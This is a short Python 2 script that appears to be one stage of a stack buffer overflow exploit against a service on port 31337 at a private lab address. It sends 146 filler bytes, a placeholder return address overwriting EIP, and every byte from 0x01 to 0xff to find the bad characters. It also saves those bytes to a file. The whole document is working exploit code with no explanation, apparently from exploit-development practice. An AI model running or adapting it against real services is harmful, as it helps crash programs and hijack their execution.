#!/usr/bin/env python2
import socket

RHOST="192.168.205.170"
RPORT=31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

total = 1024
offset = 146

badchars = ""
knownbad = [0x00]
for i in range(0x00, 0xff+1):
  if i not in knownbad:
    badchars += chr(i)

with open("badchar.bin", "wb") as f:
  f.write(badchars)

buf = ""
buf = "A"*(offset - len(buf))
buf += "BCDE"                   # EIP
buf += badchars                 # ESP
buf += "F"*(total - len(buf))
buf += "\n"

s.send(buf)

print "Sent: {0}".format(buf)

resp = s.recv(1024)
